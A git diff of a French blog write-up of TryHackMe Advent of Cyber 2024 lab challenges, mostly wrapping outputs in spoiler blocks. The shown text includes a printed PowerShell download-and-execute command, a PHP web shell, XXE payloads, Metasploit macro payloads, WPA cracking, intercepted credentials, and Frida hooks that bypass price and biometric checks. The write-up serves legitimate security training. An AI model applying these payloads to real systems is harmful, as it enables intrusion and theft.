@@ -81,6 +81,8 @@ exiftool song.mp3
 ```
 
 {% capture spoil %}
+
+```txt
 ExifTool Version Number         : 11.88
 File Name                       : song.mp3
 Directory                       : .
@@ -96,6 +98,8 @@ Track                           : 0/1
 Comment                         : 
 Date/Time Original              : 2024
 Duration                        : 0:03:11 (approx)
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -106,6 +110,8 @@ exiftool somg.mp3
 ```
 
 {% capture spoil %}
+
+```txt
 ExifTool Version Number         : 11.88
 File Name                       : somg.mp3
 Directory                       : .
@@ -122,6 +128,8 @@ Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1
 Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
 Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
 Machine ID                      : win-base-2019
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -250,6 +258,8 @@ La première étape consiste à trouver le chemin du fichier `shell.php` qui a �
 
 Nous allons à présent utiliser le code {% include dictionary.html word="PHP" %} fourni dans le défi pour reproduire l'attaque {% include dictionary.html word="RCE" %} observée.
 
+{% capture spoil %}
+
 ```php
 <html>
 <body>
@@ -268,6 +278,9 @@ Nous allons à présent utiliser le code {% include dictionary.html word="PHP" %
 </body>
 </html>
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Ce code permet de créer une page web contenant un champ dans lequel nous pourrons entrer notre commande, et qui nous affichera la réponse en dessous.
 
@@ -316,10 +329,18 @@ De retour dans l'outil Event Viewer, dans le dossier Sysmon, nous observons la p
 
 Nous récupérons le contenu du fichier texte créé :
 
+```powershell
+Get-Content 'C:\Users\Administrator\AppData\Local\temp\PhishingAttachment.txt
+```
+
+{% capture spoil %}
+
 ```txt
-Get-Content 'C:\Users\Administrator\AppData\Local\temp\PhishingAttachment.txt'
 THM{[...expurgé...]}
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Pour trouver quel identifiant ATT&CK est en jeu, nous nous rendons dans la section [*Command and Scripting Interpreter*](https://attack.mitre.org/techniques/T1059/)
 
@@ -335,11 +356,13 @@ En ouvrant les différentes sous-techniques associées nous trouvons celle qui e
 
 Pour trouver le nom du test Atomic à simuler, nous utilisons la commande `Invoke-AtomicTest` avec le flag `-ShowDetailsBrief`
 
-```powershell
-Invoke-AtomicTest T[...expurge...] -ShowDetailsBrief
+```txt
+Invoke-AtomicTest T[...expurgé...] -ShowDetailsBrief
 ```
 
 {% capture spoil %}
+
+```txt
 PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
 
 [...expurgé...]-1 Create and Execute Batch Script
@@ -347,6 +370,8 @@ PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
 [...expurgé...]-3 Suspicious Execution via Windows Command Shell
 [...expurgé...]-4 [...expurgé...]
 [...expurgé...]-5 Command Prompt read contents from CMD file and execute
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -354,11 +379,13 @@ McSkidy souhaitant mettre en place un test imitant un *ransomware*, le test num�
 
 En regardant les détails de ce test, nous pouvons trouver le nom du fichier qui sera nécessaire :
 
-```powershell
-Invoke-AtomicTest T[...expurge...] -TestNumbers 4 -ShowDetails
+```txt
+Invoke-AtomicTest T[...expurgé...] -TestNumbers 4 -ShowDetails
 ```
 
 {% capture spoil %}
+
+```txt
 PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
 
 [********BEGIN TEST*******]
@@ -391,6 +418,8 @@ new-item #{file_to_print} -value "This file has been created by T[...expurgé...
 Get Prereq Command (with inputs):
 new-item C:\Tools\AtomicRedTeam\atomics\T[...expurgé...]\src\[...expurgé...].txt -value "This file has been created by T[...expurgé...] Test 4" -Force | Out-Null
 [!!!!!!!!END TEST!!!!!!!]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -447,6 +476,8 @@ Lorsque nous procédons au *Checkout*, le site nous indique que nous venons de c
 
 Par chance, nous avons utilisé [Burp Suite](https://portswigger.net/burp) afin d'intercepter les requêtes {% include dictionary.html word="HTTP" %}. L'outil nous permet de constater qu'une action sur la page `/wishlist.php` utilise le format {% include dictionary.html word="XML" %}.
 
+{% capture spoil %}
+
 ```http
 POST /wishlist.php HTTP/1.1
 Host: 10.10.75.70
@@ -469,7 +500,12 @@ Connection: keep-alive
 </wishlist>
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Nous envoyons cette requête dans le *Repeater* de Burp, et nous modifions la partie {% include dictionary.html word="XML" %} de la manière suivante afin de vérifier si nous avons accès à notre *wishlist*:
+
+{% capture spoil %}
 
 ```xml
 <!--?xml version="1.0" ?-->
@@ -486,7 +522,12 @@ Nous envoyons cette requête dans le *Repeater* de Burp, et nous modifions la pa
 </wishlist>
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Nous obtenons bien notre panier :
+
+{% capture spoil %}
 
 ```http
 HTTP/1.1 200 OK
@@ -508,13 +549,18 @@ Quantity: 1
 is invalid.
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Puisqu'il y a 20 autres souhaits avant le nôtre dans le dossier, nous envoyons cette requête vers la partie *Intruder* de Burp afin d'automatiser la recherche.
 
 Nous positionnons la cible (entre les symboles `§`) sur le numéro du fichier `wish_§21§.txt`, un type de *Payload* "*Numbers*" de 1 à 20
 
 Une fois l'attaque effectuée, nous constatons que la longueur de la 15ème réponse est significativement plus longue que les autres. En l'analysant, nous y trouvons un flag :
 
-```http
+{% capture spoil %}
+
+```txt
 HTTP/1.1 200 OK
 Date: Sat, 14 Dec 2024 10:31:55 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -535,7 +581,12 @@ PS: The flag is THM{[...expurgé..]}
 is invalid.
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Nous accédons à présent à la page de `CHANGELOG` pour trouver l'origine de cette vulnérabilité, et nous constatons un commit récent accompagné d'un flag.
+
+{% capture spoil %}
 
 ```txt
 commit 3f786850e387550fdab836ed7e6dc881de23001b (HEAD -> master, origin/master, origin/HEAD)
@@ -546,6 +597,9 @@ Date:   Wed Dec 4 21:24:22 2024 +0200
 
 [...expurgé pour brièveté...]
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas
 
@@ -596,8 +650,16 @@ En analysant le document créé à la recherche des lettres `THM` nous trouvons 
 
 ```powershell
 Get-Content C:\Users\Administrator\Desktop\malstring.txt | Select-String THM
+```
+
+{% capture spoil %}
+
+```txt
 THM{[...expurgé...]}
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Jour 7 : *Oh no. I'M SPEAKING IN CLOUDTRAIL!*
 
@@ -614,6 +676,8 @@ jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "
 ```
 
 {% capture spoil %}
+
+```txt
 Event_Time            Event_type        Event_Name                           Event_Source                         User_Name  Source_IP        User_Agent
 2024-11-28T15:22:12Z  AwsApiCall        HeadBucket                           s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
 2024-11-28T15:22:23Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
@@ -630,6 +694,8 @@ Event_Time            Event_type        Event_Name                           Eve
 2024-11-28T15:22:13Z  AwsApiCall        GetStorageLensDashboardDataInternal  s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
 2024-11-28T15:21:57Z  AwsApiCall        DescribeEventAggregates              health.amazonaws.com                 glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
 2024-11-28T15:21:57Z  AwsApiCall        GetCostAndUsage                      ce.amazonaws.com                     glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -653,8 +719,12 @@ jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "
 ```
 
 {% capture spoil %}
+
+```txt
 Event_Time            Event_type  Event_Name  Event_Source       User_Name  Source_IP     Created_username
 2024-11-28T15:21:35Z  AwsApiCall  CreateUser  iam.amazonaws.com  mcskidy    53.94.201.69  glitch
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -667,8 +737,12 @@ jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "
 ```
 
 {% capture spoil %}
+
+```txt
 Event_Time            Event_type  Event_Name        Event_Source       User_Name  Source_IP     Privileges
 2024-11-28T15:21:36Z  AwsApiCall  AttachUserPolicy  iam.amazonaws.com  mcskidy    53.94.201.69  arn:aws:iam::aws:policy/[...expurgé...]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -679,6 +753,8 @@ jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "
 ```
 
 {% capture spoil %}
+
+```txt
 Event_Time            Event_type        Event_Name    Event_Source          User_Name      Source_IP
 2024-11-28T15:18:37Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
 2024-11-28T15:20:54Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mcskidy        5[...expurgé...]9
@@ -693,6 +769,8 @@ Event_Time            Event_type        Event_Name    Event_Source          User
 2024-11-24T02:28:17Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
 2024-11-25T21:48:22Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
 2024-11-26T22:55:51Z  AwsConsoleSignIn  ConsoleLogin  signin.amazonaws.com  mayor_malware  5[...expurgé...]9
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -703,11 +781,15 @@ grep -E '([0-9]{4}\s){3}[0-9]{4}' rds.log | grep -i 'mayor'
 ```
 
 {% capture spoil %}
+
+```txt
 2024-11-28T15:23:02.605Z 2024-11-28T15:23:02.605700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 193.45)
 2024-11-28T15:23:02.792Z 2024-11-28T15:23:02.792161Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 998.13)
 2024-11-28T15:23:02.976Z 2024-11-28T15:23:02.976943Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 865.75)
 2024-11-28T15:23:03.161Z 2024-11-28T15:23:03.161700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 409.54)
 [...expurgé pour brièveté...]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -834,8 +916,16 @@ Mode                LastWriteTime         Length Name
 
 
 Get-Content flag.txt
+```
+
+{% capture spoil %}
+
+```txt
 AOC{[...expurge...]}
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Jour 9 : 9 heure, rend le GRC amusant, ne le dis à personne
 
@@ -903,6 +993,8 @@ msf6 exploit(multi/fileformat/office_word_macro) > show options
 ```
 
 {% capture spoil %}
+
+```txt
 Module options (exploit/multi/fileformat/office_word_macro):
 
    Name            Current Setting                     Required  Description
@@ -937,10 +1029,12 @@ msf6 exploit(multi/fileformat/office_word_macro) > run
 [*] Injecting macro and other required files in document
 [*] Finalizing docm: you_w0n.docm
 [+] you_w0n.docm stored at /root/.msf4/local/you_w0n.docm
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
-> l'option `setg` (*set global*) permet de saisir les paramètres qui seront conservés, ce qui nous fera gagner du temps lors de la mise en place du *handler* à l'étape suivante.
+> L'option `setg` (*set global*) permet de saisir les paramètres qui seront conservés, ce qui nous fera gagner du temps lors de la mise en place du *handler* à l'étape suivante.
 
 ```txt
 msf6 exploit(multi/fileformat/office_word_macro) > use multi/handler
@@ -1031,6 +1125,8 @@ sudo iw dev wlan2 scan
 ```
 
 {% capture spoil %}
+
+```txt
 BSS 02:[...expurgé...]:00(on wlan2)
 	last seen: 488.100s [boottime]
 	TSF: 1734777765845574 usec (20078d, 10:42:45)
@@ -1055,6 +1151,8 @@ BSS 02:[...expurgé...]:00(on wlan2)
 	Extended capabilities:
 		 * Extended Channel Switching
 		 * Operating Mode Notification
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1088,6 +1186,8 @@ sudo airodump-ng -c 6 --bssid 02:[...expurgé...]:00 -w output-file wlan2
 ```
 
 {% capture spoil %}
+
+```txt
 #Mode écoute
 BSSID                  PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 
@@ -1097,6 +1197,8 @@ BSSID                  PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUT
 BSSID                  STATION                PWR   Rate    Lost    Frames  Notes  Probes
 
 02:[...expurgé...]:00  02:[...expurgé...]:00  -29    0 - 1      0        3 
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1119,6 +1221,8 @@ sudo aircrack-ng -a 2 -b 02:[...expurgé...]:00 -w /home/glitch/rockyou.txt outp
 ```
 
 {% capture spoil %}
+
+```txt
 Reading packets, please wait...
 Opening output-file-04.cap
 Read 273 packets.
@@ -1143,6 +1247,8 @@ Read 273 packets.
                        6A AA 89 62 0A 6F A9 30 CB BD AA 76 12 4B 2B D0 
 
       EAPOL HMAC     : 2C 1F 19 3C B3 77 DD 9A F6 F5 0C D1 5F 3C D8 E8
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1237,6 +1343,8 @@ Nous allons nous insérer dans le trafic en nous faisant passer pour la passerel
 
 Nous interceptons les identifiants de l'elfe Snowball lors de sa connexion :
 
+{% capture spoil %}
+
 ```http
 POST /login.php HTTP/1.1
 Host: gift-scheduler.thm
@@ -1249,11 +1357,16 @@ Connection: keep-alive
 username=snowballelf&password=[...expurgé...]
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 En nous connectant avec ces identifiants, nous pouvons récupérer le premier flag :
 
 {% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_elf_flag.png" caption="Connexion avec les identifiants d'un elfe" %}
 
 Nous observons également les identifiants de Marta Mayware :
+
+{% capture spoil %}
 
 ```http
 POST /login.php HTTP/1.1
@@ -1266,6 +1379,9 @@ Connection: keep-alive
 
 username=marta_mayware&password=[...expurgé...]
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous accédons ainsi à la page d'administration, récupérons le flag, et pouvons même tenter d'annuler G-day (la tentation était trop forte) :
 
@@ -1296,12 +1412,16 @@ Get-Content 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell
 ```
 
 {% capture spoil %}
+
+```txt
 whoami
 ifconfig
 ipconfig
 ping 1.2.3.4
 ping 1.1.1.1
 [...expurgé...]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1316,11 +1436,15 @@ Get-GPO -All | Where-Object { $_.ModificationTime } | Select-Object DisplayName,
 ```
 
 {% capture spoil %}
+
+```txt
 DisplayName                                ModificationTime
 -----------                                ----------------
 Default Domain Policy                      10/14/2024 12:19:28 PM
 Default Domain Controllers Policy          10/14/2024 12:17:30 PM
 Malicious GPO - [...expurgé...]            10/30/2024 9:01:36 AM
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1339,6 +1463,8 @@ az ad user list --filter "startsWith('wvusr-', displayName)"
 ```
 
 {% capture spoil %}
+
+```json
 [
 [...expurgé pour brièveté...]
   {
@@ -1356,6 +1482,8 @@ az ad user list --filter "startsWith('wvusr-', displayName)"
   },
 [...expurgé pour brièveté...]
 ]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1366,6 +1494,8 @@ az ad group list
 ```
 
 {% capture spoil %}
+
+```json
 [
   {
     "classification": null,
@@ -1380,6 +1510,8 @@ az ad group list
     [...expurgé pour brièveté...]
   }
 ]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1390,6 +1522,8 @@ az ad group member list --group "Secret Recovery Group"
 ```
 
 {% capture spoil %}
+
+```json
 [
   {
     "@odata.type": "#microsoft.graph.user",
@@ -1406,6 +1540,8 @@ az ad group member list --group "Secret Recovery Group"
     "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
   }
 ]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1419,6 +1555,8 @@ az login -u wvusr-backupware@aoc2024.onmicrosoft.com -p R[...expurgé...]s!
 ```
 
 {% capture spoil %}
+
+```txt
 Authentication with username and password in the command line is strongly discouraged. Use one of the recommended authentication methods based on your requirements. For more details, see https://go.microsoft.com/fwlink/?linkid=2276314
 Cloud Shell is automatically authenticated under the initial account signed-in with. Run 'az login' only if you need to use a different account
 [
@@ -1439,6 +1577,8 @@ Cloud Shell is automatically authenticated under the initial account signed-in w
     }
   }
 ]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1449,6 +1589,8 @@ az role assignment list --assignee 7d96660a[...expurgé...]1762d0cb66b7 --all
 ```
 
 {% capture spoil %}
+
+```json
 [
   {
     [...expurgé pour brièveté...]
@@ -1467,6 +1609,8 @@ az role assignment list --assignee 7d96660a[...expurgé...]1762d0cb66b7 --all
     "updatedOn": "2024-10-14T20:26:53.771014+00:00"
   }
 ]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1477,6 +1621,8 @@ az keyvault list
 ```
 
 {% capture spoil %}
+
+```json
 [
   {
     "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
@@ -1487,6 +1633,8 @@ az keyvault list
     "type": "Microsoft.KeyVault/vaults"
   }
 ]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1497,6 +1645,8 @@ az keyvault secret list --vault-name warevillesecrets
 ```
 
 {% capture spoil %}
+
+```json
 [
   {
     [...expurgé pour brièveté...]
@@ -1507,6 +1657,8 @@ az keyvault secret list --vault-name warevillesecrets
     "tags": {}
   }
 ]
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1515,6 +1667,8 @@ az keyvault secret show --vault-name warevillesecrets --name [...expurgé...]
 ```
 
 {% capture spoil %}
+
+```json
 {
 [...expurgé pour brièveté...]
   "contentType": null,
@@ -1525,6 +1679,8 @@ az keyvault secret show --vault-name warevillesecrets --name [...expurgé...]
   "tags": {},
   "value": "W[...expurgé...]9"
 }
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1574,6 +1730,11 @@ L'injection de code a fonctionné, nous observons le trafic suivant :
 
 ```bash
 tcpdump -ni ens5 icmp
+```
+
+{% capture spoil %}
+
+```txt
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
 21:30:14.340593 IP 10.10.72.125 > 147.185.132.180: ICMP 10.10.72.125 udp port 427 unreachable, length 65
@@ -1586,6 +1747,9 @@ listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
 21:30:38.075010 IP 10.10.176.254 > 10.10.72.125: ICMP echo request, id 1, seq 4, length 64
 21:30:38.075084 IP 10.10.72.125 > 10.10.176.254: ICMP echo reply, id 1, seq 4, length 64
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous mettons notre machine d'attaque en écoute avec {% include dictionary.html word="netcat" %}, nous injectons du code permettant d'obtenir un *{% include dictionary.html word="reverse-shell" %}*
 
@@ -1612,8 +1776,16 @@ find / -iname flag.txt -type f 2>/dev/null
 /home/analyst/flag.txt
 
 cat /home/analyst/flag.txt
+```
+
+{% capture spoil %}
+
+```txt
 THM{[...expurgé...]}
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Jour 19 : J'ai juste remarqué que tu étais mal stocké, mon cher secret
 
@@ -1642,6 +1814,8 @@ Nous trouvons la première fonction `_Z7set_otpi` qui permet de générer le cod
 
 Nous modifions cette fonction afin de récupérer la valeur du code OTP avec Frida.
 
+{% capture spoil %}
+
 ```js
 defineHandler({
   onEnter(log, args, state) {
@@ -1652,6 +1826,9 @@ defineHandler({
   }
 });
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 On relance la discussion avec le pingouin :
 
@@ -1686,6 +1863,8 @@ Grâce à l'outil Frida, nous sommes en mesure d'identifier la fonction permetta
 
 Nous commençons par récupérer la valeurs des arguments utiles dans la fonction afin d'en comprendre le fonctionnement.
 
+{% capture spoil %}
+
 ```js
 defineHandler({
   onEnter(log, args, state) {
@@ -1699,6 +1878,9 @@ defineHandler({
   }
 });
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 En relançant la conversation, nous constatons que le prix de l'objet est stocké à la deuxième place dans le tableau des arguments :
 
@@ -1719,6 +1901,8 @@ Instrumenting...
 
 Nous forçons donc la valeur de cet arguments à la valeur 0.
 
+{% capture spoil %}
+
 ```js
 defineHandler({
   onEnter(log, args, state) {
@@ -1730,6 +1914,9 @@ defineHandler({
   }
 });
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 > Il ne faudra rien acheter d'autre car l'argent disponible devra être au-dessus de 0 (par exemple en achetant l'*advice* on se retrouvera avec -4 pièces, il faudra utiliser l'ordinateur pour en récupérer)
 
@@ -1758,6 +1945,8 @@ Nous ouvrons la fonction contrôlant la biométrie :
 
 {% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_biometric.png" caption="Script répondant à la validation de la biométrie" %}
 
+{% capture spoil %}
+
 ```js
 defineHandler({
   onEnter(log, args, state) {
@@ -1770,6 +1959,9 @@ defineHandler({
   }
 });
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ```txt
 frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
@@ -1793,6 +1985,8 @@ Instrumenting...
 
 Bien que nous ne puissions vraisemblablement pas interagir avec la valeur du paramètre que nous avons récupéré dans la première partie de la fonction (qui semble être la valeur attendue si nous devions taper sur la clavier), nous allons forcer la valeur de sortie à **VRAI** (ou **1** en binaire) afin de contourner la procédure de sécurité.
 
+{% capture spoil %}
+
 ```js
 defineHandler({
   onEnter(log, args, state) {
@@ -1804,6 +1998,9 @@ defineHandler({
   }
 });
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous parvenons à tromper la vigilance du dernier pingouin qui nous fourni le dernier flag de ce défi.
 
@@ -1818,6 +2015,8 @@ Nous parvenons à tromper la vigilance du dernier pingouin qui nous fourni le de
 Ce défi consiste à suivre la propagation d'un outil de {% include dictionary.html word="C2" %} en analysant un enregistrement [Wireshark](https://www.wireshark.org/).
 
 Nous pouvons apercevoir un paquet {% include dictionary.html word="HTTP" %} semblant être le point de départ de la compromission (`POST /initial`). En suivant ce paquet numéro **440**, nous y observons l'adresse IP du serveur C2, et confirmation de la mise en place d'une communication.
+
+{% capture spoil %}
 
 ```http
 POST /initial HTTP/1.1
@@ -1835,7 +2034,12 @@ Date: Thu, 17 Oct 2024 09:47:04 GMT
 Perfect!
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Suivons à présent le flux du paquet {% include dictionary.html word="HTTP" %} **457** (`GET /command`) pour découvrir la première commande exécutée par le serveur C2.
+
+{% capture spoil %}
 
 ```http
 GET /command HTTP/1.1
@@ -1851,7 +2055,12 @@ Content-Type: text/plain
 [...expurgé...]
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Le paquet {% include dictionary.html word="HTTP" %} **476** (`POST /exfiltrate`) nous indique qu'un fichier a été exfiltré, et nous avons des informations sur le chiffrement utilisé dans le processus.
+
+{% capture spoil %}
 
 ```http
 POST /exfiltrate HTTP/1.1
@@ -1875,7 +2084,12 @@ Date: Thu, 17 Oct 2024 09:47:04 GMT
 Data received
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Le paquet {% include dictionary.html word="HTTP" %} **488** (`POST /beacon`) nous permet d'obtenir le contenu chiffré du fichier critique ayant été exfiltré.
+
+{% capture spoil %}
 
 ```http
 POST /beacon HTTP/1.1
@@ -1893,6 +2107,9 @@ Date: Thu, 17 Oct 2024 09:47:04 GMT
 Beacon acknowledged
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Le chiffrement AES-ECB étant reversible, il est possible de déchiffrer les informations qui ont été récupérées par Mayor Malware grâce au site [CyberChef](https://gchq.github.io/CyberChef/)
 
 {% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-20_beacon.png" caption="Informations déchiffrées" %}
@@ -1909,6 +2126,8 @@ Le chiffrement AES-ECB étant reversible, il est possible de déchiffrer les inf
 </div>
 
 En décompilant `WarevilleApp.exe` nous y trouvons la fonction téléchargeant et exécutant un programme :
+
+{% capture spoil %}
 
 ```c#
 private void [...expurge...]()
@@ -1932,7 +2151,12 @@ private void [...expurge...]()
 }
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 En décompilant le fichier téléchargé par l'exécutable précédent :
+
+{% capture spoil %}
 
 ```c#
 private static void Main(string[] args)
@@ -1945,6 +2169,11 @@ private static void Main(string[] args)
   }
 }
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+{% capture spoil %}
 
 ```c#
 private static void UploadFileToServer(string zipFilePath)
@@ -1962,6 +2191,9 @@ private static void UploadFileToServer(string zipFilePath)
 }
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 ## Jour 22 : *It's because I'm kubed, isn't it?*
 
 ![Kubernetes DFIR](https://img.shields.io/badge/Kubernetes%20DFIR-314267?logo=tryhackme)
@@ -1973,12 +2205,16 @@ tail -n 6 pod_apache2_access.log
 ```
 
 {% capture spoil %}
+
+```txt
 127.0.0.1 - - [29/Oct/2024:12:38:45 +0000] "GET /[...expurgé...].php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
 127.0.0.1 - - [29/Oct/2024:12:38:53 +0000] "GET /[...expurgé...].php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
 127.0.0.1 - - [29/Oct/2024:12:38:59 +0000] "GET /[...expurgé...].php?cmd=ls HTTP/1.1" 200 386 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
 127.0.0.1 - - [29/Oct/2024:12:39:16 +0000] "GET /[...expurgé...].php?cmd=cat+[...expurgé...].php HTTP/1.1" 200 463 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
 127.0.0.1 - - [29/Oct/2024:12:39:38 +0000] "GET /[...expurgé...].php?cmd=whoami HTTP/1.1" 200 224 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
 127.0.0.1 - - [29/Oct/2024:12:39:46 +0000] "GET /[...expurgé...].php?cmd=which+[...expurgé...] HTTP/1.1" 200 215 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1987,8 +2223,12 @@ grep -i "head" docker-registry-logs.log | cut -d " " -f1 | sort -n | uniq -c
 ```
 
 {% capture spoil %}
+
+```txt
      32 1[...expurgé...]3
      81 172.17.0.1
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -1997,11 +2237,15 @@ grep "1[...expurgé...]3" docker-registry-logs.log | head -n 5
 ```
 
 {% capture spoil %}
+
+```txt
 1[...expurgé...]3 - - [...expurgé...        +0000] "GET /v2/ HTTP/1.1" 401 87 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
 1[...expurgé...]3 - - [29/Oct/2024:10:06:33 +0000] "GET /v2/ HTTP/1.1" 200 2 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
 1[...expurgé...]3 - - [29/Oct/2024:10:07:01 +0000] "GET /v2/ HTTP/1.1" 401 87 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
